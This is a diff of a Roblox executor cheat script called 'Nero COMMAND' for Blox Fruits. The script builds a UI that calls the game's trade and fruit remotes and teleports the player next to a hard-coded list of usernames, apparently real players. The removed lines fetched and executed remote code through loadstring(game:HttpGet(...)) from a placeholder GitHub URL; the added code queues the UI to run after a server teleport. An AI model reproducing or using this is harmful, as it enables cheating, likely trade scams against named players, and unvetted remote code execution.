@@ -1,401 +1,403 @@
 local jobId = getgenv().JOBID or game.JobId
-local targetUser = getgenv().USER or "Smiley9Gamerz"
-
-print("NERO TP: Loading...")
 
 local TeleportService = game:GetService("TeleportService")
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
 local BLOX_FRUITS_PLACE_ID = 4442272183
 
 if game.JobId == jobId then
-    task.wait(3)
-    
-    local TweenService = game:GetService("TweenService")
-    local UserInputService = game:GetService("UserInputService")
-    
-    local fruitMap = {
-        ["dragon"] = "Dragon", ["kitsune"] = "Kitsune", ["leopard"] = "Leopard",
-        ["dough"] = "Dough", ["venom"] = "Venom", ["shadow"] = "Shadow",
-        ["control"] = "Control", ["spirit"] = "Spirit", ["tiger"] = "Tiger",
-        ["yeti"] = "Yeti", ["gas"] = "Gas", ["mammoth"] = "Mammoth",
-        ["t-rex"] = "T-Rex", ["gravity"] = "Gravity", ["blizzard"] = "Blizzard",
-        ["pain"] = "Pain", ["lightning"] = "Lightning", ["portal"] = "Portal",
-        ["phoenix"] = "Phoenix", ["sound"] = "Sound", ["spider"] = "Spider",
-        ["buddha"] = "Buddha", ["quake"] = "Quake", ["magma"] = "Magma",
-        ["love"] = "Love", ["rubber"] = "Rubber", ["ghost"] = "Ghost",
-        ["ice"] = "Ice", ["flame"] = "Flame", ["dark"] = "Dark",
-        ["light"] = "Light", ["sand"] = "Sand", ["diamond"] = "Diamond",
-        ["eagle"] = "Eagle", ["rocket"] = "Rocket", ["spin"] = "Spin",
-        ["blade"] = "Blade", ["spring"] = "Spring", ["bomb"] = "Bomb",
-        ["smoke"] = "Smoke", ["spike"] = "Spike", ["werewolf"] = "Werewolf",
-        ["crimson"] = "Crimson Kitsune", ["ember"] = "Ember Dragon",
-        ["divine"] = "Divine Portal", ["torment"] = "Torment Pain",
-        ["galaxy"] = "Galaxy", ["glacier"] = "Glacier Eagle",
-        ["green"] = "Green Lightning", ["red"] = "Red Lightning",
-        ["purple"] = "Purple Lightning", ["empyrean"] = "Empyrean"
-    }
-    
-    local function normalizeFruitName(input)
-        if not input then return "" end
-        return fruitMap[input:lower()] or input:gsub("^%l", string.upper)
-    end
-    
-    local TradeFunction = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction")
-    local CommF = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
-    
-    local playerGui = LocalPlayer:WaitForChild("PlayerGui")
-    
-    if playerGui:FindFirstChild("NeroUI") then
-        playerGui.NeroUI:Destroy()
-    end
-    
-    local gui = Instance.new("ScreenGui")
-    gui.Name = "NeroUI"
-    gui.ResetOnSpawn = false
-    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    gui.Parent = playerGui
-    
-    local mainFrame = Instance.new("Frame")
-    mainFrame.Name = "MainFrame"
-    mainFrame.Size = UDim2.new(0, 350, 0, 400)
-    mainFrame.Position = UDim2.new(0.3, 0, 0.3, 0)
-    mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
-    mainFrame.BorderSizePixel = 0
-    mainFrame.Parent = gui
-    
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, 12)
-    corner.Parent = mainFrame
-    
-    local stroke = Instance.new("UIStroke")
-    stroke.Color = Color3.fromRGB(80, 180, 220)
-    stroke.Thickness = 2
-    stroke.Parent = mainFrame
-    
-    local titleBar = Instance.new("Frame")
-    titleBar.Name = "TitleBar"
-    titleBar.Size = UDim2.new(1, 0, 0, 35)
-    titleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
-    titleBar.BorderSizePixel = 0
-    titleBar.Parent = mainFrame
-    
-    local titleCorner = Instance.new("UICorner")
-    titleCorner.CornerRadius = UDim.new(0, 12, 0, 0)
-    titleCorner.Parent = titleBar
-    
-    local titleText = Instance.new("TextLabel")
-    titleText.Name = "TitleText"
-    titleText.Size = UDim2.new(0.8, 0, 1, 0)
-    titleText.Position = UDim2.new(0, 10, 0, 0)
-    titleText.BackgroundTransparency = 1
-    titleText.Text = "⚡ NERO COMMAND"
-    titleText.Font = Enum.Font.GothamBold
-    titleText.TextSize = 16
-    titleText.TextColor3 = Color3.fromRGB(255, 255, 255)
-    titleText.TextXAlignment = Enum.TextXAlignment.Left
-    titleText.Parent = titleBar
-    
-    local closeBtn = Instance.new("TextButton")
-    closeBtn.Name = "CloseBtn"
-    closeBtn.Size = UDim2.new(0, 30, 0, 30)
-    closeBtn.Position = UDim2.new(1, -35, 0, 3)
-    closeBtn.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
-    closeBtn.BorderSizePixel = 0
-    closeBtn.Text = "✕"
-    closeBtn.Font = Enum.Font.GothamBold
-    closeBtn.TextSize = 16
-    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    closeBtn.Parent = titleBar
-    
-    local closeCorner = Instance.new("UICorner")
-    closeCorner.CornerRadius = UDim.new(0, 6)
-    closeCorner.Parent = closeBtn
-    
-    closeBtn.MouseButton1Click:Connect(function()
-        gui:Destroy()
-    end)
-    
-    local dragging = false
-    local dragInput, dragStart, startPos
-    
-    local function update(input)
-        local delta = input.Position - dragStart
-        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-    end
-    
-    titleBar.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-            dragging = true
-            dragStart = input.Position
-            startPos = mainFrame.Position
-            input.Changed:Connect(function()
-                if input.UserInputState == Enum.UserInputState.End then
-                    dragging = false
-                end
-            end)
-        end
-    end)
-    
-    titleBar.InputChanged:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-            dragInput = input
-        end
-    end)
-    
-    UserInputService.InputChanged:Connect(function(input)
-        if input == dragInput and dragging then
-            update(input)
-        end
-    end)
-    
-    local inputFrame = Instance.new("Frame")
-    inputFrame.Name = "InputFrame"
-    inputFrame.Size = UDim2.new(1, -20, 0, 80)
-    inputFrame.Position = UDim2.new(0, 10, 0, 45)
-    inputFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
-    inputFrame.BorderSizePixel = 0
-    inputFrame.Parent = mainFrame
-    
-    local inputCorner = Instance.new("UICorner")
-    inputCorner.CornerRadius = UDim.new(0, 8)
-    inputCorner.Parent = inputFrame
-    
-    local inputLabel = Instance.new("TextLabel")
-    inputLabel.Name = "InputLabel"
-    inputLabel.Size = UDim2.new(1, -10, 0, 20)
-    inputLabel.Position = UDim2.new(0, 5, 0, 5)
-    inputLabel.BackgroundTransparency = 1
-    inputLabel.Text = "Enter Fruit Name:"
-    inputLabel.Font = Enum.Font.Gotham
-    inputLabel.TextSize = 13
-    inputLabel.TextColor3 = Color3.fromRGB(200, 220, 255)
-    inputLabel.TextXAlignment = Enum.TextXAlignment.Left
-    inputLabel.Parent = inputFrame
-    
-    local fruitInput = Instance.new("TextBox")
-    fruitInput.Name = "FruitInput"
-    fruitInput.Size = UDim2.new(1, -10, 0, 30)
-    fruitInput.Position = UDim2.new(0, 5, 0, 25)
-    fruitInput.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
-    fruitInput.BorderSizePixel = 0
-    fruitInput.PlaceholderText = "e.g. dragon, kitsune, dough"
-    fruitInput.Text = ""
-    fruitInput.Font = Enum.Font.Gotham
-    fruitInput.TextSize = 14
-    fruitInput.TextColor3 = Color3.fromRGB(255, 255, 255)
-    fruitInput.Parent = inputFrame
-    
-    local inputBoxCorner = Instance.new("UICorner")
-    inputBoxCorner.CornerRadius = UDim.new(0, 6)
-    inputBoxCorner.Parent = fruitInput
-    
-    local buttonFrame = Instance.new("Frame")
-    buttonFrame.Name = "ButtonFrame"
-    buttonFrame.Size = UDim2.new(1, -20, 0, 45)
-    buttonFrame.Position = UDim2.new(0, 10, 0, 130)
-    buttonFrame.BackgroundTransparency = 1
-    buttonFrame.Parent = mainFrame
-    
-    local addButton = Instance.new("TextButton")
-    addButton.Name = "AddButton"
-    addButton.Size = UDim2.new(0.48, 0, 1, 0)
-    addButton.Position = UDim2.new(0, 0, 0, 0)
-    addButton.BackgroundColor3 = Color3.fromRGB(60, 180, 80)
-    addButton.BorderSizePixel = 0
-    addButton.Text = "➕ ADD FRUIT"
-    addButton.Font = Enum.Font.GothamBold
-    addButton.TextSize = 13
-    addButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-    addButton.Parent = buttonFrame
-    
-    local addCorner = Instance.new("UICorner")
-    addCorner.CornerRadius = UDim.new(0, 8)
-    addCorner.Parent = addButton
-    
-    local clearButton = Instance.new("TextButton")
-    clearButton.Name = "ClearButton"
-    clearButton.Size = UDim2.new(0.48, 0, 1, 0)
-    clearButton.Position = UDim2.new(0.52, 0, 0, 0)
-    clearButton.BackgroundColor3 = Color3.fromRGB(180, 60, 60)
-    clearButton.BorderSizePixel = 0
-    clearButton.Text = "🗑️ CLEAR FRUIT"
-    clearButton.Font = Enum.Font.GothamBold
-    clearButton.TextSize = 13
-    clearButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-    clearButton.Parent = buttonFrame
-    
-    local clearCorner = Instance.new("UICorner")
-    clearCorner.CornerRadius = UDim.new(0, 8)
-    clearCorner.Parent = clearButton
-    
-    local statusLabel = Instance.new("TextLabel")
-    statusLabel.Name = "StatusLabel"
-    statusLabel.Size = UDim2.new(1, -20, 0, 30)
-    statusLabel.Position = UDim2.new(0, 10, 0, 180)
-    statusLabel.BackgroundColor3 = Color3.fromRGB(35, 40, 55)
-    statusLabel.BorderSizePixel = 0
-    statusLabel.Text = "✅ Connected to Server\n🎯 Target: " .. targetUser
-    statusLabel.Font = Enum.Font.Gotham
-    statusLabel.TextSize = 12
-    statusLabel.TextColor3 = Color3.fromRGB(180, 220, 255)
-    statusLabel.TextWrapped = true
-    statusLabel.Parent = mainFrame
-    
-    local statusCorner = Instance.new("UICorner")
-    statusCorner.CornerRadius = UDim.new(0, 6)
-    statusCorner.Parent = statusLabel
-    
-    local commandFrame = Instance.new("Frame")
-    commandFrame.Name = "CommandFrame"
-    commandFrame.Size = UDim2.new(1, -20, 0, 140)
-    commandFrame.Position = UDim2.new(0, 10, 0, 215)
-    commandFrame.BackgroundTransparency = 1
-    commandFrame.Parent = mainFrame
-    
-    local function createCommandButton(name, text, xPos, yPos, width, callback)
-        local button = Instance.new("TextButton")
-        button.Name = name
-        button.Size = UDim2.new(width, -5, 0, 32)
-        button.Position = UDim2.new(xPos, 0, yPos, 0)
-        button.BackgroundColor3 = Color3.fromRGB(50, 60, 90)
-        button.BorderSizePixel = 0
-        button.Text = text
-        button.Font = Enum.Font.Gotham
-        button.TextSize = 12
-        button.TextColor3 = Color3.fromRGB(255, 255, 255)
-        button.Parent = commandFrame
-        
-        local buttonCorner = Instance.new("UICorner")
-        buttonCorner.CornerRadius = UDim.new(0, 6)
-        buttonCorner.Parent = button
-        
-        button.MouseButton1Click:Connect(function()
-            if callback then callback() end
-        end)
-        
-        return button
-    end
-    
-    createCommandButton("AcceptBtn", "🤝 ACCEPT TRADE", 0, 0, 0.48, function()
-        pcall(function() TradeFunction:InvokeServer("AcceptTrade") end)
-        pcall(function() TradeFunction:InvokeServer("accept") end)
-        statusLabel.Text = "✅ Trade accepted!"
-    end)
-    
-    createCommandButton("JumpBtn", "🎯 JUMP", 0.52, 0, 0.48, function()
-        local char = LocalPlayer.Character
-        if char and char:FindFirstChildOfClass("Humanoid") then
-            char:FindFirstChildOfClass("Humanoid").Jump = true
-            statusLabel.Text = "✅ Jumped!"
-        end
-    end)
-    
-    createCommandButton("TPBtn", "📍 TELEPORT", 0, 0.33, 0.48, function()
-        local target = Players:FindFirstChild(targetUser)
-        if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
-            local char = LocalPlayer.Character
-            if char and char:FindFirstChild("HumanoidRootPart") then
-                char.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame + Vector3.new(5, 0, 0)
-                statusLabel.Text = "📍 Teleported to " .. targetUser
-            end
-        else
-            statusLabel.Text = "❌ Target not found: " .. targetUser
-        end
-    end)
-    
-    createCommandButton("TestBtn", "✅ TEST", 0.52, 0.33, 0.48, function()
-        local char = LocalPlayer.Character
-        if char and char:FindFirstChildOfClass("Humanoid") then
-            char:FindFirstChildOfClass("Humanoid").Jump = true
-        end
-        statusLabel.Text = "✅ Test response sent!"
-    end)
-    
-    createCommandButton("ResetBtn", "🔄 RESET WITH FRUIT", 0, 0.66, 1, function()
-        local fruitName = normalizeFruitName(fruitInput.Text)
-        if fruitName == "" then
-            statusLabel.Text = "❌ Enter fruit name first!"
-            return
-        end
-        
-        local fruitID = fruitName .. "-" .. fruitName
-        pcall(function() CommF:InvokeServer("StoreFruit", fruitID) end)
-        
-        local success = false
-        for try = 1, 3 do
-            local pcallSuccess = pcall(function()
-                return CommF:InvokeServer("LoadFruit", fruitID)
-            end)
-            if pcallSuccess then
-                success = true
-                break
-            end
-            task.wait(1)
-        end
-        
-        if success then
-            fruitInput.Text = ""
-            statusLabel.Text = "🔄 Equipped " .. fruitName .. " & resetting..."
-            task.wait(1)
-            local char = LocalPlayer.Character
-            if char and char:FindFirstChild("Humanoid") then
-                char.Humanoid.Health = 0
-            end
-        else
-            statusLabel.Text = "❌ Failed to equip " .. fruitName
-        end
-    end)
-    
-    addButton.MouseButton1Click:Connect(function()
-        local fruitName = normalizeFruitName(fruitInput.Text)
-        if fruitName == "" then
-            statusLabel.Text = "❌ Enter fruit name!"
-            return
-        end
-        
-        local fullItemName = fruitName .. "-" .. fruitName
-        local success = pcall(function()
-            TradeFunction:InvokeServer("addItem", fullItemName)
-        end)
-        
-        if success then
-            fruitInput.Text = ""
-            statusLabel.Text = "✅ Added " .. fruitName .. " to trade!"
-        else
-            statusLabel.Text = "❌ Failed to add " .. fruitName
-        end
-    end)
-    
-    clearButton.MouseButton1Click:Connect(function()
-        local fruitName = normalizeFruitName(fruitInput.Text)
-        if fruitName == "" then
-            statusLabel.Text = "❌ Enter fruit name!"
-            return
-        end
-        
-        local fullItemName = fruitName .. "-" .. fruitName
-        local success = pcall(function()
-            TradeFunction:InvokeServer("removeItem", fullItemName)
-        end)
-        
-        if success then
-            fruitInput.Text = ""
-            statusLabel.Text = "🗑️ Removed " .. fruitName .. " from trade!"
-        else
-            statusLabel.Text = "❌ Failed to remove " .. fruitName
-        end
-    end)
-    
-    print("✅ Nero UI Loaded!")
-    
+    print("Already in target server!")
 else
+    print("Teleporting to server...")
+    
     queue_on_teleport([[
         task.wait(3)
-        print("✅ Teleport successful!")
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/YOURUSERNAME/nero-teleport/main/nero-teleport.lua"))()
+        print("Loading UI after teleport...")
+        
+        local Players = game:GetService("Players")
+        local LocalPlayer = Players.LocalPlayer
+        local TweenService = game:GetService("TweenService")
+        local UserInputService = game:GetService("UserInputService")
+        local ReplicatedStorage = game:GetService("ReplicatedStorage")
+        
+        task.wait(2)
+        
+        local fruitMap = {
+            ["dragon"] = "Dragon", ["kitsune"] = "Kitsune", ["leopard"] = "Leopard",
+            ["dough"] = "Dough", ["venom"] = "Venom", ["shadow"] = "Shadow",
+            ["control"] = "Control", ["spirit"] = "Spirit", ["tiger"] = "Tiger",
+            ["yeti"] = "Yeti", ["gas"] = "Gas", ["mammoth"] = "Mammoth",
+            ["t-rex"] = "T-Rex", ["gravity"] = "Gravity", ["blizzard"] = "Blizzard",
+            ["pain"] = "Pain", ["lightning"] = "Lightning", ["portal"] = "Portal",
+            ["phoenix"] = "Phoenix", ["sound"] = "Sound", ["spider"] = "Spider",
+            ["buddha"] = "Buddha", ["quake"] = "Quake", ["magma"] = "Magma",
+            ["love"] = "Love", ["rubber"] = "Rubber", ["ghost"] = "Ghost",
+            ["ice"] = "Ice", ["flame"] = "Flame", ["dark"] = "Dark",
+            ["light"] = "Light", ["sand"] = "Sand", ["diamond"] = "Diamond",
+            ["eagle"] = "Eagle", ["rocket"] = "Rocket", ["spin"] = "Spin",
+            ["blade"] = "Blade", ["spring"] = "Spring", ["bomb"] = "Bomb",
+            ["smoke"] = "Smoke", ["spike"] = "Spike", ["werewolf"] = "Werewolf",
+            ["crimson"] = "Crimson Kitsune", ["ember"] = "Ember Dragon",
+            ["divine"] = "Divine Portal", ["torment"] = "Torment Pain",
+            ["galaxy"] = "Galaxy", ["glacier"] = "Glacier Eagle",
+            ["green"] = "Green Lightning", ["red"] = "Red Lightning",
+            ["purple"] = "Purple Lightning", ["empyrean"] = "Empyrean"
+        }
+        
+        local function normalizeFruitName(input)
+            if not input then return "" end
+            return fruitMap[input:lower()] or input:gsub("^%l", string.upper)
+        end
+        
+        local TradeFunction = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction")
+        local CommF = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
+        
+        local playerGui = LocalPlayer:WaitForChild("PlayerGui")
+        
+        if playerGui:FindFirstChild("NeroUI") then
+            playerGui.NeroUI:Destroy()
+        end
+        
+        local gui = Instance.new("ScreenGui")
+        gui.Name = "NeroUI"
+        gui.ResetOnSpawn = false
+        gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+        gui.Parent = playerGui
+        
+        local mainFrame = Instance.new("Frame")
+        mainFrame.Name = "MainFrame"
+        mainFrame.Size = UDim2.new(0, 350, 0, 400)
+        mainFrame.Position = UDim2.new(0.3, 0, 0.3, 0)
+        mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
+        mainFrame.BorderSizePixel = 0
+        mainFrame.Parent = gui
+        
+        local corner = Instance.new("UICorner")
+        corner.CornerRadius = UDim.new(0, 12)
+        corner.Parent = mainFrame
+        
+        local stroke = Instance.new("UIStroke")
+        stroke.Color = Color3.fromRGB(80, 180, 220)
+        stroke.Thickness = 2
+        stroke.Parent = mainFrame
+        
+        local titleBar = Instance.new("Frame")
+        titleBar.Name = "TitleBar"
+        titleBar.Size = UDim2.new(1, 0, 0, 35)
+        titleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
+        titleBar.BorderSizePixel = 0
+        titleBar.Parent = mainFrame
+        
+        local titleCorner = Instance.new("UICorner")
+        titleCorner.CornerRadius = UDim.new(0, 12, 0, 0)
+        titleCorner.Parent = titleBar
+        
+        local titleText = Instance.new("TextLabel")
+        titleText.Name = "TitleText"
+        titleText.Size = UDim2.new(0.8, 0, 1, 0)
+        titleText.Position = UDim2.new(0, 10, 0, 0)
+        titleText.BackgroundTransparency = 1
+        titleText.Text = "⚡ NERO COMMAND"
+        titleText.Font = Enum.Font.GothamBold
+        titleText.TextSize = 16
+        titleText.TextColor3 = Color3.fromRGB(255, 255, 255)
+        titleText.TextXAlignment = Enum.TextXAlignment.Left
+        titleText.Parent = titleBar
+        
+        local closeBtn = Instance.new("TextButton")
+        closeBtn.Name = "CloseBtn"
+        closeBtn.Size = UDim2.new(0, 30, 0, 30)
+        closeBtn.Position = UDim2.new(1, -35, 0, 3)
+        closeBtn.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
+        closeBtn.BorderSizePixel = 0
+        closeBtn.Text = "✕"
+        closeBtn.Font = Enum.Font.GothamBold
+        closeBtn.TextSize = 16
+        closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+        closeBtn.Parent = titleBar
+        
+        local closeCorner = Instance.new("UICorner")
+        closeCorner.CornerRadius = UDim.new(0, 6)
+        closeCorner.Parent = closeBtn
+        
+        closeBtn.MouseButton1Click:Connect(function()
+            gui:Destroy()
+        end)
+        
+        local dragging = false
+        local dragInput, dragStart, startPos
+        
+        local function update(input)
+            local delta = input.Position - dragStart
+            mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+        
+        titleBar.InputBegan:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+                dragging = true
+                dragStart = input.Position
+                startPos = mainFrame.Position
+                input.Changed:Connect(function()
+                    if input.UserInputState == Enum.UserInputState.End then
+                        dragging = false
+                    end
+                end)
+            end
+        end)
+        
+        titleBar.InputChanged:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+                dragInput = input
+            end
+        end)
+        
+        UserInputService.InputChanged:Connect(function(input)
+            if input == dragInput and dragging then
+                update(input)
+            end
+        end)
+        
+        local inputFrame = Instance.new("Frame")
+        inputFrame.Name = "InputFrame"
+        inputFrame.Size = UDim2.new(1, -20, 0, 80)
+        inputFrame.Position = UDim2.new(0, 10, 0, 45)
+        inputFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
+        inputFrame.BorderSizePixel = 0
+        inputFrame.Parent = mainFrame
+        
+        local inputCorner = Instance.new("UICorner")
+        inputCorner.CornerRadius = UDim.new(0, 8)
+        inputCorner.Parent = inputFrame
+        
+        local inputLabel = Instance.new("TextLabel")
+        inputLabel.Name = "InputLabel"
+        inputLabel.Size = UDim2.new(1, -10, 0, 20)
+        inputLabel.Position = UDim2.new(0, 5, 0, 5)
+        inputLabel.BackgroundTransparency = 1
+        inputLabel.Text = "Enter Fruit Name:"
+        inputLabel.Font = Enum.Font.Gotham
+        inputLabel.TextSize = 13
+        inputLabel.TextColor3 = Color3.fromRGB(200, 220, 255)
+        inputLabel.TextXAlignment = Enum.TextXAlignment.Left
+        inputLabel.Parent = inputFrame
+        
+        local fruitInput = Instance.new("TextBox")
+        fruitInput.Name = "FruitInput"
+        fruitInput.Size = UDim2.new(1, -10, 0, 30)
+        fruitInput.Position = UDim2.new(0, 5, 0, 25)
+        fruitInput.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
+        fruitInput.BorderSizePixel = 0
+        fruitInput.PlaceholderText = "e.g. dragon, kitsune, dough"
+        fruitInput.Text = ""
+        fruitInput.Font = Enum.Font.Gotham
+        fruitInput.TextSize = 14
+        fruitInput.TextColor3 = Color3.fromRGB(255, 255, 255)
+        fruitInput.Parent = inputFrame
+        
+        local inputBoxCorner = Instance.new("UICorner")
+        inputBoxCorner.CornerRadius = UDim.new(0, 6)
+        inputBoxCorner.Parent = fruitInput
+        
+        local buttonFrame = Instance.new("Frame")
+        buttonFrame.Name = "ButtonFrame"
+        buttonFrame.Size = UDim2.new(1, -20, 0, 45)
+        buttonFrame.Position = UDim2.new(0, 10, 0, 130)
+        buttonFrame.BackgroundTransparency = 1
+        buttonFrame.Parent = mainFrame
+        
+        local addButton = Instance.new("TextButton")
+        addButton.Name = "AddButton"
+        addButton.Size = UDim2.new(0.48, 0, 1, 0)
+        addButton.Position = UDim2.new(0, 0, 0, 0)
+        addButton.BackgroundColor3 = Color3.fromRGB(60, 180, 80)
+        addButton.BorderSizePixel = 0
+        addButton.Text = "➕ ADD FRUIT"
+        addButton.Font = Enum.Font.GothamBold
+        addButton.TextSize = 13
+        addButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        addButton.Parent = buttonFrame
+        
+        local addCorner = Instance.new("UICorner")
+        addCorner.CornerRadius = UDim.new(0, 8)
+        addCorner.Parent = addButton
+        
+        local clearButton = Instance.new("TextButton")
+        clearButton.Name = "ClearButton"
+        clearButton.Size = UDim2.new(0.48, 0, 1, 0)
+        clearButton.Position = UDim2.new(0.52, 0, 0, 0)
+        clearButton.BackgroundColor3 = Color3.fromRGB(180, 60, 60)
+        clearButton.BorderSizePixel = 0
+        clearButton.Text = "🗑️ CLEAR FRUIT"
+        clearButton.Font = Enum.Font.GothamBold
+        clearButton.TextSize = 13
+        clearButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        clearButton.Parent = buttonFrame
+        
+        local clearCorner = Instance.new("UICorner")
+        clearCorner.CornerRadius = UDim.new(0, 8)
+        clearCorner.Parent = clearButton
+        
+        local statusLabel = Instance.new("TextLabel")
+        statusLabel.Name = "StatusLabel"
+        statusLabel.Size = UDim2.new(1, -20, 0, 30)
+        statusLabel.Position = UDim2.new(0, 10, 0, 180)
+        statusLabel.BackgroundColor3 = Color3.fromRGB(35, 40, 55)
+        statusLabel.BorderSizePixel = 0
+        statusLabel.Text = "✅ Connected to Server"
+        statusLabel.Font = Enum.Font.Gotham
+        statusLabel.TextSize = 12
+        statusLabel.TextColor3 = Color3.fromRGB(180, 220, 255)
+        statusLabel.TextWrapped = true
+        statusLabel.Parent = mainFrame
+        
+        local statusCorner = Instance.new("UICorner")
+        statusCorner.CornerRadius = UDim.new(0, 6)
+        statusCorner.Parent = statusLabel
+        
+        local commandFrame = Instance.new("Frame")
+        commandFrame.Name = "CommandFrame"
+        commandFrame.Size = UDim2.new(1, -20, 0, 140)
+        commandFrame.Position = UDim2.new(0, 10, 0, 215)
+        commandFrame.BackgroundTransparency = 1
+        commandFrame.Parent = mainFrame
+        
+        local function createCommandButton(name, text, xPos, yPos, width, callback)
+            local button = Instance.new("TextButton")
+            button.Name = name
+            button.Size = UDim2.new(width, -5, 0, 32)
+            button.Position = UDim2.new(xPos, 0, yPos, 0)
+            button.BackgroundColor3 = Color3.fromRGB(50, 60, 90)
+            button.BorderSizePixel = 0
+            button.Text = text
+            button.Font = Enum.Font.Gotham
+            button.TextSize = 12
+            button.TextColor3 = Color3.fromRGB(255, 255, 255)
+            button.Parent = commandFrame
+            
+            local buttonCorner = Instance.new("UICorner")
+            buttonCorner.CornerRadius = UDim.new(0, 6)
+            buttonCorner.Parent = button
+            
+            button.MouseButton1Click:Connect(function()
+                if callback then callback() end
+            end)
+            
+            return button
+        end
+        
+        createCommandButton("AcceptBtn", "🤝 ACCEPT TRADE", 0, 0, 0.48, function()
+            pcall(function() TradeFunction:InvokeServer("AcceptTrade") end)
+            pcall(function() TradeFunction:InvokeServer("accept") end)
+            statusLabel.Text = "✅ Trade accepted!"
+        end)
+        
+        createCommandButton("JumpBtn", "🎯 JUMP", 0.52, 0, 0.48, function()
+            local char = LocalPlayer.Character
+            if char and char:FindFirstChildOfClass("Humanoid") then
+                char:FindFirstChildOfClass("Humanoid").Jump = true
+                statusLabel.Text = "✅ Jumped!"
+            end
+        end)
+        
+        createCommandButton("TPBtn", "📍 FIND TARGET", 0, 0.33, 0.48, function()
+            local targetNames = {"Smiley9Gamerz", "FAITH0YT", "BUZZFTGOD", "KITSUNEPLS_908"}
+            for _, name in ipairs(targetNames) do
+                local target = Players:FindFirstChild(name)
+                if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
+                    local char = LocalPlayer.Character
+                    if char and char:FindFirstChild("HumanoidRootPart") then
+                        char.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame + Vector3.new(5, 0, 0)
+                        statusLabel.Text = "📍 Teleported to " .. name
+                        break
+                    end
+                end
+            end
+        end)
+        
+        createCommandButton("TestBtn", "✅ TEST", 0.52, 0.33, 0.48, function()
+            local char = LocalPlayer.Character
+            if char and char:FindFirstChildOfClass("Humanoid") then
+                char:FindFirstChildOfClass("Humanoid").Jump = true
+            end
+            statusLabel.Text = "✅ Test response sent!"
+        end)
+        
+        createCommandButton("ResetBtn", "🔄 RESET WITH FRUIT", 0, 0.66, 1, function()
+            local fruitName = normalizeFruitName(fruitInput.Text)
+            if fruitName == "" then
+                statusLabel.Text = "❌ Enter fruit name first!"
+                return
+            end
+            
+            local fruitID = fruitName .. "-" .. fruitName
+            pcall(function() CommF:InvokeServer("StoreFruit", fruitID) end)
+            
+            local success = false
+            for try = 1, 3 do
+                local pcallSuccess = pcall(function()
+                    return CommF:InvokeServer("LoadFruit", fruitID)
+                end)
+                if pcallSuccess then
+                    success = true
+                    break
+                end
+                task.wait(1)
+            end
+            
+            if success then
+                fruitInput.Text = ""
+                statusLabel.Text = "🔄 Equipped " .. fruitName .. " & resetting..."
+                task.wait(1)
+                local char = LocalPlayer.Character
+                if char and char:FindFirstChild("Humanoid") then
+                    char.Humanoid.Health = 0
+                end
+            else
+                statusLabel.Text = "❌ Failed to equip " .. fruitName
+            end
+        end)
+        
+        addButton.MouseButton1Click:Connect(function()
+            local fruitName = normalizeFruitName(fruitInput.Text)
+            if fruitName == "" then
+                statusLabel.Text = "❌ Enter fruit name!"
+                return
+            end
+            
+            local fullItemName = fruitName .. "-" .. fruitName
+            local success = pcall(function()
+                TradeFunction:InvokeServer("addItem", fullItemName)
+            end)
+            
+            if success then
+                fruitInput.Text = ""
+                statusLabel.Text = "✅ Added " .. fruitName .. " to trade!"
+            else
+                statusLabel.Text = "❌ Failed to add " .. fruitName
+            end
+        end)
+        
+        clearButton.MouseButton1Click:Connect(function()
+            local fruitName = normalizeFruitName(fruitInput.Text)
+            if fruitName == "" then
+                statusLabel.Text = "❌ Enter fruit name!"
+                return
+            end
+            
+            local fullItemName = fruitName .. "-" .. fruitName
+            local success = pcall(function()
+                TradeFunction:InvokeServer("removeItem", fullItemName)
+            end)
+            
+            if success then
+                fruitInput.Text = ""
+                statusLabel.Text = "🗑️ Removed " .. fruitName .. " from trade!"
+            else
+                statusLabel.Text = "❌ Failed to remove " .. fruitName
+            end
+        end)
+        
+        print("✅ Nero Command UI Loaded!")
     ]])
     
     if game.PlaceId ~= BLOX_FRUITS_PLACE_ID then
